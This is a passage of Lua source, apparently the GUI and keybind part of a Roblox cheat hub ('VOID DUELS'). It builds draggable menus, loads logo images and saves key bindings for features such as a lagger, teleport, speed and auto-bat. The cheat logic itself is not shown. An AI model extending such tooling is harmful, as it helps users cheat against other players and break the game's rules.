    end)
    dragTarget.InputChanged:Connect(function(input)
        if input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch then dragInput=input end
    end)
    UIS.InputChanged:Connect(function(input)
        if input==dragInput and dragging then
            if uiLocked then return end
            local delta=input.Position-dragStart
            moveTarget.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+delta.X,startPos.Y.Scale,startPos.Y.Offset+delta.Y)
        end
    end)
end
local C={
    bg=Color3.fromRGB(6,6,6),bgDark=Color3.fromRGB(3,3,3),row=Color3.fromRGB(16,16,16),
    input=Color3.fromRGB(16,16,16),blue=Color3.fromRGB(210,210,210),blueDim=Color3.fromRGB(70,70,70),
    blueDark=Color3.fromRGB(22,22,22),text=Color3.fromRGB(255,255,255),textDim=Color3.fromRGB(160,160,160),
    textMuted=Color3.fromRGB(100,100,100),white=Color3.fromRGB(255,255,255),divider=Color3.fromRGB(32,32,32),
    green=Color3.fromRGB(80,220,120),
}
function guiCorner(p,r) local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 10); c.Parent=p; return c end
function guiStroke(p,col,t) local s=Instance.new("UIStroke"); s.Color=col or Color3.fromRGB(60,60,70); s.Thickness=t or 1; s.Parent=p; return s end
function tw(obj,props,ti) TweenService:Create(obj,ti or TweenInfo.new(0.12),props):Play() end
local GuiToggleSetters={}
local GuiRefs={}
local LeftPanel=nil
local Keys={
    circle=Enum.KeyCode.E,speed=Enum.KeyCode.Q,carryMode=Enum.KeyCode.C,
    laggerToggle=Enum.KeyCode.K,laggerCarry=Enum.KeyCode.B,guiHide=Enum.KeyCode.RightControl,
    dropBrainrot=Enum.KeyCode.H,tpDown=Enum.KeyCode.T,
    autoLeft=Enum.KeyCode.J,autoRight=Enum.KeyCode.L,
    tpBat=Enum.KeyCode.Y,
    batV2=Enum.KeyCode.V,
}
pcall(function()
    if not(isfile and isfile("RXZ_HUB.json")) then return end
    local ok,d=pcall(function() return HS:JSONDecode(readfile("RXZ_HUB.json")) end)
    if not (ok and type(d)=="table") then return end
    if type(d.keys)=="table" then
        for k,v in pairs(d.keys) do
            local ok2,kc=pcall(function() return Enum.KeyCode[v] end)
            if ok2 and kc and kc~=Enum.KeyCode.Unknown then Keys[k]=kc end
        end
    end
    -- also hydrate KB if already defined
    if KB then
        local function _loadKC(name)
            if type(name)~="string" or name=="" then return nil end
            local ok2,kc=pcall(function() return Enum.KeyCode[name] end)
            if ok2 and kc and kc~=Enum.KeyCode.Unknown then return kc end
            return nil
        end
        if type(d.keybinds)=="table" then
            for name,data in pairs(d.keybinds) do
                if KB[name] and type(data)=="table" then
                    if data.kb ~= nil then KB[name].kb = _loadKC(data.kb) end
                    if data.gp ~= nil then KB[name].gp = _loadKC(data.gp) end
                end
            end
        end
        local legacyMap = {
            dropBrainrotKey="DropBrainrot", autoLeftKey="AutoLeft", autoRightKey="AutoRight",
            autoBatKey="AutoBat", laggerToggleKey="LaggerToggle", laggerCarryKey="LaggerCarry",
            tpBatKey="TPBat", tpFloorKey="TPFloor", guiHideKey="GuiHide",
            speedToggleKey="SpeedToggle", batV2Key="BatV2",
        }
        for cfgKey, kbName in pairs(legacyMap) do
            local data=d[cfgKey]
            if type(data)=="table" and KB[kbName] then
                if data.kb ~= nil then KB[kbName].kb = _loadKC(data.kb) end
                if data.gp ~= nil then KB[kbName].gp = _loadKC(data.gp) end
            end
        end
    end
end)
_GuiKeys=Keys
-- mirror KB → Keys after both exist
pcall(function()
    if KB.GuiHide and KB.GuiHide.kb then Keys.guiHide = KB.GuiHide.kb end
    if KB.SpeedToggle and KB.SpeedToggle.kb then Keys.carryMode = KB.SpeedToggle.kb end
    if KB.LaggerToggle and KB.LaggerToggle.kb then Keys.laggerToggle = KB.LaggerToggle.kb end
    if KB.LaggerCarry and KB.LaggerCarry.kb then Keys.laggerCarry = KB.LaggerCarry.kb end
    if KB.AutoBat and KB.AutoBat.kb then Keys.circle = KB.AutoBat.kb end
    if KB.TPBat and KB.TPBat.kb then Keys.tpBat = KB.TPBat.kb end
    if KB.AutoLeft and KB.AutoLeft.kb then Keys.autoLeft = KB.AutoLeft.kb end
    if KB.AutoRight and KB.AutoRight.kb then Keys.autoRight = KB.AutoRight.kb end
    if KB.DropBrainrot and KB.DropBrainrot.kb then Keys.dropBrainrot = KB.DropBrainrot.kb end
    if KB.TPFloor and KB.TPFloor.kb then Keys.tpDown = KB.TPFloor.kb end
    if KB.BatV2 and KB.BatV2.kb then Keys.batV2 = KB.BatV2.kb end
    _GuiKeys = Keys
end)

-- BUILD HUB GUI
;(function()
    local GuiHub=Instance.new("ScreenGui")
    GuiHub.Name="VoidVS"; GuiHub.ResetOnSpawn=false
    GuiHub.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; GuiHub.Parent=PlayerGui
    GuiRefs.hub=GuiHub
    local Outer=Instance.new("Frame")
    Outer.Name="Outer"; Outer.Size=UDim2.new(0,300,0,460); Outer.Position=UDim2.new(0,6,0,48)
    Outer.BackgroundTransparency=1; Outer.BorderSizePixel=0; Outer.ClipsDescendants=false; Outer.Parent=GuiHub
    GuiRefs.outer=Outer
    local OuterScale=Instance.new("UIScale"); OuterScale.Scale=0.70; OuterScale.Parent=Outer; GuiRefs.outerScale=OuterScale
    local Inner=Instance.new("Frame")
    Inner.Name="Inner"; Inner.ClipsDescendants=false; Inner.Size=UDim2.new(1,0,1,0)
    Inner.BackgroundColor3=C.bg; Inner.BackgroundTransparency=0; Inner.BorderSizePixel=0; Inner.Parent=Outer
    guiCorner(Inner,24); guiStroke(Inner,Color3.fromRGB(45,45,45),1.5); GuiRefs.inner=Inner
    local BgCont=Instance.new("Frame")
    BgCont.Name="BackgroundContainer"; BgCont.Size=UDim2.new(1,0,1,0); BgCont.BackgroundTransparency=1; BgCont.ZIndex=0; BgCont.Parent=Inner
    local BgGrad=Instance.new("Frame")
    BgGrad.Name="BgGrad"; BgGrad.Size=UDim2.new(1,0,1,0); BgGrad.BackgroundColor3=C.bgDark
    BgGrad.BorderSizePixel=0; BgGrad.ZIndex=0; BgGrad.Parent=BgCont; guiCorner(BgGrad,24)
    local grad=Instance.new("UIGradient")
    grad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(4,4,4)),ColorSequenceKeypoint.new(0.5,Color3.fromRGB(7,7,7)),ColorSequenceKeypoint.new(1,Color3.fromRGB(4,4,4))})
    grad.Rotation=135; grad.Parent=BgGrad; GuiRefs.bgGrad=BgGrad
    local BgImg=Instance.new("ImageLabel")
    BgImg.Name="BackgroundImage"; BgImg.Size=UDim2.new(1,0,1,0); BgImg.BackgroundTransparency=1
    BgImg.Image=""; BgImg.ScaleType=Enum.ScaleType.Crop; BgImg.ZIndex=0; BgImg.ImageTransparency=0.35; BgImg.Visible=false
    BgImg.Parent=BgCont; guiCorner(BgImg,24); GuiRefs.backgroundImage=BgImg; bgImageRef=BgImg
    local HF=Instance.new("Frame")
    HF.Name="HeaderFrame"; HF.Size=UDim2.new(1,0,0,140); HF.ClipsDescendants=false; HF.BackgroundTransparency=1; HF.BorderSizePixel=0; HF.Parent=Inner; HF.ZIndex=2
    makeDraggable_cyber(HF,Outer)
    -- Circle logo ImageButton next to script name
    local LogoBtn=Instance.new("ImageButton")
    LogoBtn.Name="LogoCircle"
    LogoBtn.Size=UDim2.new(0,40,0,40)
    LogoBtn.Position=UDim2.new(0,10,0,40)
    LogoBtn.BackgroundColor3=Color3.fromRGB(20,20,24)
    LogoBtn.BackgroundTransparency=0
    LogoBtn.BorderSizePixel=0
    LogoBtn.AutoButtonColor=false
    LogoBtn.ScaleType=Enum.ScaleType.Crop
    LogoBtn.Image=""
    LogoBtn.ZIndex=3
    LogoBtn.Visible = false
    LogoBtn.Parent=HF
    Instance.new("UICorner",LogoBtn).CornerRadius=UDim.new(1,0)
    local logoStroke=Instance.new("UIStroke",LogoBtn)
    logoStroke.Color=Color3.fromRGB(80,80,90)
    logoStroke.Thickness=1.5
    logoCircleRef = LogoBtn
    GuiRefs.logoCircle = LogoBtn
    logoCircleEnabled = false
    LogoBtn.Visible = false
    task.spawn(function()
        local LOGO_URL="https://files.catbox.moe/mlyr71.png"
        local asset = loadCustomImageAsset(LOGO_URL, "voidvs_menu_logo.png")
        if LogoBtn and LogoBtn.Parent then
            LogoBtn.Image = asset
        end
    end)
    LogoBtn.MouseButton1Click:Connect(function()
        -- soft pulse feedback
        pcall(function()
            local s = LogoBtn.Size
            TweenService:Create(LogoBtn, TweenInfo.new(0.08), {Size = UDim2.new(0,34,0,34)}):Play()
            task.delay(0.08, function()
                TweenService:Create(LogoBtn, TweenInfo.new(0.12, Enum.EasingStyle.Back), {Size = UDim2.new(0,40,0,40)}):Play()
            end)
        end)
    end)
    -- Adapt-style brand TITLE IMAGE (transparent bg, large)
    -- cleaned transparent logo (no white plate)
    local TITLE_URL = "https://files.catbox.moe/p3s0qg.png"
    local TITLE_URL_FALLBACK = "https://files.catbox.moe/p3s0qg.png"
    local TL=Instance.new("ImageLabel")
    TL.Name="VoidTitle"
    TL.AnchorPoint=Vector2.new(0.5,0.5)
    TL.Position=UDim2.new(0.5,0,0.5,0)
    TL.Size=UDim2.new(0,300,0,150)
    TL.BackgroundTransparency=1
    TL.BackgroundColor3=Color3.fromRGB(0,0,0)
    TL.BorderSizePixel=0
    TL.ScaleType=Enum.ScaleType.Fit
    TL.Image=""
    TL.ImageTransparency=0
    TL.ImageColor3=(getVoidAccent and getVoidAccent()) or Color3.fromRGB(255,255,255)
    TL.ZIndex=6
    TL.Parent=HF
    GuiRefs.voidTitle=TL
    task.spawn(function()
        -- force re-download clean asset (delete old cached white-bg file)
        pcall(function()
            if isfile and isfile("voidvs_title.png") then delfile("voidvs_title.png") end
            if isfile and isfile("voidvs_title_nobg.png") then delfile("voidvs_title_nobg.png") end
            if isfile and isfile("voidvs_title_p3s0qg.png") then delfile("voidvs_title_p3s0qg.png") end
        end)
        local asset = loadCustomImageAsset(TITLE_URL, "voidvs_title_p3s0qg.png")
        if (not asset or asset=="") then
            asset = loadCustomImageAsset(TITLE_URL_FALLBACK, "voidvs_title.png")
        end
        if TL and TL.Parent then
            TL.BackgroundTransparency = 1
            if asset and asset ~= "" then
                TL.Image = asset
            else
                TL.Image = TITLE_URL
            end
        end
    end)
    local CloseBtn=Instance.new("TextButton")
    CloseBtn.Size=UDim2.new(0,28,0,28); CloseBtn.Position=UDim2.new(1,-38,0,12)
    CloseBtn.BackgroundColor3=C.bgDark; CloseBtn.BorderSizePixel=0
    CloseBtn.Text="-"; CloseBtn.TextColor3=C.textMuted; CloseBtn.Font=Enum.Font.GothamBlack; CloseBtn.TextSize=22
    CloseBtn.ZIndex=5; CloseBtn.Parent=HF
    guiCorner(CloseBtn,7); guiStroke(CloseBtn,Color3.fromRGB(45,45,45),1)
    CloseBtn.MouseEnter:Connect(function() tw(CloseBtn,{BackgroundColor3=Color3.fromRGB(28,28,28),TextColor3=C.text}) end)
    CloseBtn.MouseLeave:Connect(function() tw(CloseBtn,{BackgroundColor3=C.bgDark,TextColor3=C.textMuted}) end)
    -- Open menu pill (white VOID style, compact)
    local MiniBtn=Instance.new("TextButton")
    MiniBtn.Name="VoidOpenPill"
    MiniBtn.Size=UDim2.new(0, 220, 0, 46)
    MiniBtn.Position=Outer.Position
    MiniBtn.BackgroundColor3=Color3.fromRGB(12, 12, 14)
    MiniBtn.BorderSizePixel=0
    MiniBtn.Text=""
    MiniBtn.AutoButtonColor=false
    MiniBtn.ZIndex=20
    MiniBtn.Visible=false
    MiniBtn.Parent=GuiRefs.hub
    guiCorner(MiniBtn, 14)
    local miniStroke=Instance.new("UIStroke", MiniBtn)
    miniStroke.Color=Color3.fromRGB(55, 55, 60)
    miniStroke.Thickness=1.1
    miniStroke.Transparency=0.2

    -- left accent bar (white)
    local accent=Instance.new("Frame", MiniBtn)
    accent.Size=UDim2.new(0, 3, 0.58, 0)
    accent.Position=UDim2.new(0, 7, 0.5, 0)
    accent.AnchorPoint=Vector2.new(0, 0.5)
    accent.BackgroundColor3=Color3.fromRGB(255, 255, 255)
    accent.BorderSizePixel=0
    accent.ZIndex=21
    guiCorner(accent, 2)

    -- white logo square
    local logoBox=Instance.new("Frame", MiniBtn)
    logoBox.Size=UDim2.new(0, 34, 0, 34)
    logoBox.Position=UDim2.new(0, 16, 0.5, 0)
    logoBox.AnchorPoint=Vector2.new(0, 0.5)
    logoBox.BackgroundColor3=Color3.fromRGB(255, 255, 255)
    logoBox.BorderSizePixel=0
    logoBox.ZIndex=21
    guiCorner(logoBox, 10)
    local logoTxt=Instance.new("TextLabel", logoBox)
    logoTxt.Size=UDim2.new(1, 0, 1, 0)
    logoTxt.BackgroundTransparency=1
    logoTxt.Text="VOID"
    logoTxt.TextColor3=Color3.fromRGB(12, 12, 14)
    logoTxt.Font=Enum.Font.GothamBlack
    logoTxt.TextSize=10
    logoTxt.ZIndex=22

    -- title + subtitle
    local titleTxt=Instance.new("TextLabel", MiniBtn)
    titleTxt.Size=UDim2.new(0, 100, 0, 15)
    titleTxt.Position=UDim2.new(0, 58, 0, 9)
    titleTxt.BackgroundTransparency=1
    titleTxt.Text="VOID DUELS"
    titleTxt.TextColor3=Color3.fromRGB(255, 255, 255)
    titleTxt.Font=Enum.Font.GothamBlack
    titleTxt.TextSize=12
    titleTxt.TextXAlignment=Enum.TextXAlignment.Left
    titleTxt.ZIndex=21
    local subTxt=Instance.new("TextLabel", MiniBtn)
    subTxt.Size=UDim2.new(0, 100, 0, 12)
    subTxt.Position=UDim2.new(0, 58, 0, 25)
    subTxt.BackgroundTransparency=1
    subTxt.Text="TAP TO OPEN"
    subTxt.TextColor3=Color3.fromRGB(170, 170, 180)
    subTxt.Font=Enum.Font.GothamBold
    subTxt.TextSize=9
    subTxt.TextXAlignment=Enum.TextXAlignment.Left
    subTxt.ZIndex=21

    -- OPEN chip
    local openChip=Instance.new("Frame", MiniBtn)
    openChip.Size=UDim2.new(0, 46, 0, 26)
    openChip.Position=UDim2.new(1, -54, 0.5, 0)
    openChip.AnchorPoint=Vector2.new(0, 0.5)
    openChip.BackgroundColor3=Color3.fromRGB(22, 22, 26)
    openChip.BorderSizePixel=0
    openChip.ZIndex=21
    guiCorner(openChip, 8)
    local openChipStroke=Instance.new("UIStroke", openChip)
    openChipStroke.Color=Color3.fromRGB(60, 60, 68)
    openChipStroke.Thickness=1
    local openTxt=Instance.new("TextLabel", openChip)
    openTxt.Size=UDim2.new(1, 0, 1, 0)
    openTxt.BackgroundTransparency=1
    openTxt.Text="OPEN"
    openTxt.TextColor3=Color3.fromRGB(255, 255, 255)
    openTxt.Font=Enum.Font.GothamBold
    openTxt.TextSize=10
    openTxt.ZIndex=22

    makeDraggable_cyber(MiniBtn, MiniBtn)
    MiniBtn.MouseEnter:Connect(function()
        tw(MiniBtn, {BackgroundColor3=Color3.fromRGB(18, 18, 22)})
        tw(openChip, {BackgroundColor3=Color3.fromRGB(32, 32, 38)})
    end)
    MiniBtn.MouseLeave:Connect(function()
        tw(MiniBtn, {BackgroundColor3=Color3.fromRGB(12, 12, 14)})
        tw(openChip, {BackgroundColor3=Color3.fromRGB(22, 22, 26)})
    end)
    local guiAnimBusy = false
    local function getBaseScale()
        return (GuiRefs.outerScale and GuiRefs.outerScale.Scale) or 0.70
    end
    local function showGui()
        if guiAnimBusy then return end
        guiAnimBusy = true
        MiniBtn.Visible = false
        Outer.Visible = true
        local base = getBaseScale()
        if OuterScale then
            OuterScale.Scale = base * 0.82
        end
        if Inner then
            Inner.BackgroundTransparency = 0.35
        end
        local ti = TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        if OuterScale then
            TweenService:Create(OuterScale, ti, {Scale = base}):Play()
        end
        if Inner then
            TweenService:Create(Inner, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundTransparency = 0
            }):Play()
        end
        task.delay(0.3, function() guiAnimBusy = false end)
    end
    local function hideGui()
        if guiAnimBusy then return end
        guiAnimBusy = true
        local base = getBaseScale()
        local ti = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        if OuterScale then
            TweenService:Create(OuterScale, ti, {Scale = base * 0.86}):Play()
        end
        if Inner then
            TweenService:Create(Inner, ti, {BackgroundTransparency = 0.45}):Play()
        end
        task.delay(0.2, function()
            Outer.Visible = false
            MiniBtn.Visible = true
            if OuterScale then OuterScale.Scale = base end
            if Inner then Inner.BackgroundTransparency = 0 end
            -- mini button pop-in
            local ms = Instance.new("UIScale")
            ms.Scale = 0.7
            ms.Parent = MiniBtn
            TweenService:Create(ms, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
            task.delay(0.25, function() pcall(function() ms:Destroy() end) end)
            guiAnimBusy = false
        end)
    end
    CloseBtn.MouseButton1Click:Connect(hideGui)
    MiniBtn.MouseButton1Click:Connect(showGui)
    -- expose for keybind
    GuiRefs.showGui = showGui
    GuiRefs.hideGui = hideGui
    local HSep=Instance.new("Frame")
    HSep.Position=UDim2.new(0,14,0,130); HSep.Size=UDim2.new(1,-28,0,1); HSep.BackgroundColor3=C.blue
    HSep.BackgroundTransparency=0.7; HSep.BorderSizePixel=0; HSep.Parent=Inner; HSep.ZIndex=2
    LeftPanel=Instance.new("Frame")
    LeftPanel.Name="TabBar"; LeftPanel.Size=UDim2.new(1,-16,0,78); LeftPanel.Position=UDim2.new(0,8,0,132)
    LeftPanel.BackgroundTransparency=1; LeftPanel.BorderSizePixel=0; LeftPanel.Parent=Inner; LeftPanel.ZIndex=2
    local CatList=Instance.new("Frame")
    CatList.Name="CategoryList"; CatList.Size=UDim2.new(1,0,1,0); CatList.BackgroundTransparency=1
    CatList.BorderSizePixel=0; CatList.Parent=LeftPanel; GuiRefs.categoryList=CatList
    local CF=Instance.new("ScrollingFrame")
    CF.Name="ContentFrame"; CF.Size=UDim2.new(1,-16,1,-222); CF.Position=UDim2.new(0,8,0,214)
    CF.BackgroundTransparency=1; CF.BorderSizePixel=0; CF.ScrollBarThickness=8; CF.ScrollBarImageColor3=C.blue
    CF.CanvasSize=UDim2.new(0,0,0,800)
    CF.AutomaticCanvasSize=Enum.AutomaticSize.None
    CF.ScrollingDirection=Enum.ScrollingDirection.Y; CF.ScrollingEnabled=true; CF.Active=true
    CF.ElasticBehavior=Enum.ElasticBehavior.Never; CF.Parent=Inner; GuiRefs.contentFrame=CF
    -- Hard-stop scroll: no momentum / no bounce after finger lifts
    local _cfDragging = false
    local function snapScrollStop()
        _cfDragging = false
        local maxY = math.max(0, CF.AbsoluteCanvasSize.Y - CF.AbsoluteSize.Y)
        local snapY = math.clamp(CF.CanvasPosition.Y, 0, maxY)
        pcall(function() CF.ScrollVelocity = Vector2.new(0, 0) end)
        CF.CanvasPosition = Vector2.new(0, snapY)
        -- kill residual momentum a few frames
        task.spawn(function()
            for _ = 1, 6 do
                pcall(function() CF.ScrollVelocity = Vector2.new(0, 0) end)
                CF.CanvasPosition = Vector2.new(0, math.clamp(CF.CanvasPosition.Y, 0, maxY))
                task.wait()
            end
        end)
    end
    CF.InputBegan:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.Touch
            or inp.UserInputType==Enum.UserInputType.MouseButton1
            or inp.UserInputType==Enum.UserInputType.MouseButton2 then
            _cfDragging = true
        end
    end)
    CF.InputEnded:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.Touch
            or inp.UserInputType==Enum.UserInputType.MouseButton1
            or inp.UserInputType==Enum.UserInputType.MouseButton2 then
            snapScrollStop()
        end
    end)
    UIS.InputEnded:Connect(function(inp)
        if not _cfDragging then return end
        if inp.UserInputType==Enum.UserInputType.Touch
            or inp.UserInputType==Enum.UserInputType.MouseButton1
            or inp.UserInputType==Enum.UserInputType.MouseButton2 then
            snapScrollStop()
        end
    end)
    -- continuous velocity kill while not dragging (stops coasting)
    RunService.RenderStepped:Connect(function()
        if not _cfDragging then
            pcall(function()
                if CF.ScrollVelocity.Magnitude > 0.01 then
                    CF.ScrollVelocity = Vector2.new(0, 0)
                end
            end)
        end
    end)
    local CLay=Instance.new("UIListLayout"); CLay.SortOrder=Enum.SortOrder.LayoutOrder; CLay.Padding=UDim.new(0,6); CLay.Parent=CF
    local function refreshCanvas()
        task.defer(function()
            local totalH = 0
            for _, child in ipairs(CF:GetChildren()) do
                if child:IsA("GuiObject") and child.Visible and child.Name ~= "UIListLayout" then
                    if child:IsA("UIListLayout") or child:IsA("UIPadding") or child:IsA("UIStroke") then
                        -- skip
                    else
                        local h = 0
                        local lay = child:FindFirstChildOfClass("UIListLayout")
                        if lay then
                            h = lay.AbsoluteContentSize.Y
                        end
                        -- sum visible rows inside page
                        local sum = 0
                        for _, row in ipairs(child:GetChildren()) do
                            if row:IsA("GuiObject") and row.Visible then
                                local rh = row.AbsoluteSize.Y
                                if rh < 1 then rh = 40 end
                                sum = sum + rh + 6
                            end
                        end
                        if sum > h then h = sum end
                        if child.AbsoluteSize.Y > h then h = child.AbsoluteSize.Y end
                        if h > totalH then totalH = h end
                    end
                end
            end
            if totalH < 1 then
                totalH = CLay.AbsoluteContentSize.Y
            end
            -- Extra space so last items are fully reachable on every tab
            local pad = 220
            local need = math.max(totalH + pad, CF.AbsoluteSize.Y + 40)
            CF.CanvasSize = UDim2.new(0, 0, 0, need)
        end)
    end
    CLay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        task.defer(refreshCanvas)
    end)
    CF:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
        task.defer(refreshCanvas)
    end)
    task.spawn(function()
        for _ = 1, 12 do
            task.wait(0.12)
            refreshCanvas()
        end
    end)
    local CPad=Instance.new("UIPadding"); CPad.PaddingLeft=UDim.new(0,6); CPad.PaddingRight=UDim.new(0,6)
    CPad.PaddingTop=UDim.new(0,6); CPad.PaddingBottom=UDim.new(0,180); CPad.Parent=CF
    GuiRefs.refreshCanvas = refreshCanvas
    local BotSep=Instance.new("Frame")
    BotSep.Position=UDim2.new(0,8,1,-54); BotSep.Size=UDim2.new(1,-16,0,1); BotSep.BackgroundColor3=C.blue
    BotSep.BackgroundTransparency=0.65; BotSep.BorderSizePixel=0; BotSep.Parent=Inner; BotSep.ZIndex=2
end)()

-- KEYBIND SYSTEM
local KeyListen={cb=nil,label=nil,active=false}
local KEY_ALIASES={
    ButtonA="A",ButtonB="B",ButtonX="X",ButtonY="Y",ButtonR1="RB",ButtonR2="RT",ButtonL1="LB",ButtonL2="LT",
    DPadUp="D↑",DPadDown="D↓",DPadLeft="D←",DPadRight="D→",ButtonStart="▶",ButtonSelect="◀",
    LeftShift="LShift",RightShift="RShift",LeftControl="LCtrl",RightControl="RCtrl",LeftAlt="LAlt",RightAlt="RAlt",
    LeftSuper="LSuper",RightSuper="RSuper",Return="Enter",BackSpace="Backspace",Tab="Tab",CapsLock="CapsLock",
    Escape="Esc",Space="Space",PageUp="PgUp",PageDown="PgDn",End="End",Home="Home",Insert="Ins",Delete="Del",
    Up="↑",Down="↓",Left="←",Right="→",F1="F1",F2="F2",F3="F3",F4="F4",F5="F5",F6="F6",F7="F7",F8="F8",
    F9="F9",F10="F10",F11="F11",F12="F12",Minus="-",Equals="=",LeftBracket="[",RightBracket="]",
    BackSlash="\\",Semicolon=";",Quote="'",Comma=",",Period=".",Slash="/",Backquote="`",
    ButtonA="A (Pad)",ButtonB="B (Pad)",ButtonX="X (Pad)",ButtonY="Y (Pad)",
    ButtonL1="L1",ButtonR1="R1",ButtonL2="L2",ButtonR2="R2",
    ButtonL3="L3",ButtonR3="R3",ButtonStart="Start",ButtonSelect="Select",
    DPadUp="DPad ↑",DPadDown="DPad ↓",DPadLeft="DPad ←",DPadRight="DPad →",
    Thumbstick1="L Stick",Thumbstick2="R Stick"
}
function prettyKey(kc)
    if not kc then return "?" end
    local n = typeof(kc)=="EnumItem" and kc.Name or tostring(kc)
    return KEY_ALIASES[n] or n
end
function cancelKL()
    if KeyListen.label then KeyListen.label.BackgroundColor3=C.blue; KeyListen.label.BackgroundTransparency=0.5 end
    KeyListen.cb=nil; KeyListen.label=nil; KeyListen.active=false
end
function startKL(lbl,onSet)
    cancelKL(); KeyListen.cb=onSet; KeyListen.label=lbl; KeyListen.active=true
    lbl.Text="..."; lbl.BackgroundColor3=Color3.fromRGB(80,220,120); lbl.BackgroundTransparency=0.3
    local cap=lbl
    task.delay(10,function()
        if KeyListen.label==cap and KeyListen.active then
            cancelKL()
            if lbl and lbl.Parent then
                -- restore previous text if possible
                lbl.BackgroundColor3=C.blue; lbl.BackgroundTransparency=0.5
            end
        end
    end)
end
UIS.InputBegan:Connect(function(inp,gp)
    if not KeyListen.active then return end
    local ut=inp.UserInputType
    local isPad = ut==Enum.UserInputType.Gamepad1 or ut==Enum.UserInputType.Gamepad2
        or ut==Enum.UserInputType.Gamepad3 or ut==Enum.UserInputType.Gamepad4
    if ut~=Enum.UserInputType.Keyboard and not isPad then return end
    local k=inp.KeyCode; if k==Enum.KeyCode.Unknown then return end
    -- ignore pure stick noise
    if k==Enum.KeyCode.Thumbstick1 or k==Enum.KeyCode.Thumbstick2 then return end
    if k==Enum.KeyCode.Escape then cancelKL(); return end
    local cb=KeyListen.cb; local lb=KeyListen.label; cancelKL()
    if lb and lb.Parent then lb.Text=prettyKey(k); lb.BackgroundColor3=C.blue; lb.BackgroundTransparency=0.5 end
    if cb then task.spawn(cb,k) end
end)

-- ROW BUILDERS
function addSectLbl(parent,text,order)
    local w=Instance.new("Frame",parent); w.Size=UDim2.new(1,0,0,22); w.BackgroundTransparency=1; w.LayoutOrder=order
    local L=Instance.new("TextLabel",w); L.Size=UDim2.new(1,0,0,16); L.BackgroundTransparency=1
    L.Text=text; L.TextColor3=C.textDim; L.TextSize=10; L.Font=Enum.Font.GothamBold; L.TextXAlignment=Enum.TextXAlignment.Left
    return L
end
function addInputRow(parent,label,value,order,cb)
    local Row=Instance.new("Frame",parent); Row.Size=UDim2.new(1,0,0,36); Row.BackgroundColor3=C.row
    Row.BackgroundTransparency=0.5; Row.BorderSizePixel=0; Row.LayoutOrder=order; guiCorner(Row,10); guiStroke(Row,C.divider,1)
    local Lb=Instance.new("TextLabel",Row); Lb.Size=UDim2.new(0.6,0,0,16); Lb.Position=UDim2.new(0,12,0,6)
    Lb.BackgroundTransparency=1; Lb.Text=label; Lb.TextColor3=C.text; Lb.TextSize=11; Lb.Font=Enum.Font.GothamBold; Lb.TextXAlignment=Enum.TextXAlignment.Left
    local BC=Instance.new("Frame",Row); BC.ZIndex=6; BC.Position=UDim2.new(1,-58,0.5,-10); BC.Size=UDim2.new(0,48,0,20)
    BC.BackgroundColor3=C.input; BC.BackgroundTransparency=0.5; BC.BorderSizePixel=0; guiCorner(BC,6); guiStroke(BC,Color3.fromRGB(55,55,60),1)
    local Box=Instance.new("TextBox",BC); Box.ZIndex=7; Box.Size=UDim2.new(1,0,1,0); Box.BackgroundTransparency=1
    Box.Text=tostring(value); Box.TextColor3=C.text; Box.TextSize=11; Box.Font=Enum.Font.GothamBold; Box.ClearTextOnFocus=false
    Box.FocusLost:Connect(function() local n=tonumber(Box.Text); if n and n>0 then cb(n) else Box.Text=tostring(value) end end)
    local hov=Instance.new("TextButton",Row); hov.Size=UDim2.new(1,0,1,0); hov.BackgroundTransparency=1; hov.Text=""; hov.ZIndex=0
    hov.MouseEnter:Connect(function() tw(Row,{BackgroundTransparency=0.3}) end)
    hov.MouseLeave:Connect(function() tw(Row,{BackgroundTransparency=0.5}) end)
    return Row,Box
end
function addToggleRow(parent,label,enabled,order,kbKey,onToggle)
    local hasKB=kbKey~=nil
    local Row=Instance.new("Frame",parent); Row.Size=UDim2.new(1,0,0,hasKB and 50 or 38); Row.BackgroundColor3=C.row
    Row.BackgroundTransparency=0.5; Row.BorderSizePixel=0; Row.LayoutOrder=order; guiCorner(Row,10); guiStroke(Row,C.divider,1)
    local Lb=Instance.new("TextLabel",Row); Lb.Size=UDim2.new(0.6,0,0,16); Lb.Position=UDim2.new(0,12,0,6)
    Lb.BackgroundTransparency=1; Lb.Text=label; Lb.TextColor3=C.text; Lb.TextSize=11; Lb.Font=Enum.Font.GothamBold; Lb.TextXAlignment=Enum.TextXAlignment.Left
    if hasKB then
        if not Keys[kbKey] then Keys[kbKey]=Enum.KeyCode.Unknown end
        local KB2=Instance.new("TextButton",Row); KB2.Size=UDim2.new(0,52,0,16); KB2.Position=UDim2.new(0,12,1,-20)
        KB2.BackgroundColor3=C.blue; KB2.BackgroundTransparency=0.5; KB2.BorderSizePixel=0
        KB2.Text=Keys[kbKey]==Enum.KeyCode.Unknown and "SET" or prettyKey(Keys[kbKey])
        KB2.TextColor3=C.white; KB2.TextSize=9; KB2.Font=Enum.Font.GothamBold; guiCorner(KB2,5)
        KB2.MouseButton1Click:Connect(function()
            startKL(KB2,function(nk)
                Keys[kbKey]=nk; _GuiKeys=Keys
                KB2.Text=prettyKey(nk)
                saveConfig()
            end)
        end)
    end
    local Track=Instance.new("Frame",Row); Track.Size=UDim2.new(0,36,0,18); Track.Position=UDim2.new(1,-46,0,10)
    Track.BackgroundColor3=C.blueDark; Track.BackgroundTransparency=0.5; Track.BorderSizePixel=0; guiCorner(Track,10); guiStroke(Track,C.blueDim,1)
    local Knob=Instance.new("Frame",Track); Knob.Size=UDim2.new(0,14,0,14)
    Knob.Position=enabled and UDim2.new(0.5,2,0.5,-7) or UDim2.new(0,2,0.5,-7)
    Knob.BackgroundColor3=C.blue; Knob.BackgroundTransparency=enabled and 0.3 or 0.5; Knob.BorderSizePixel=0; guiCorner(Knob,7)
    local st=enabled
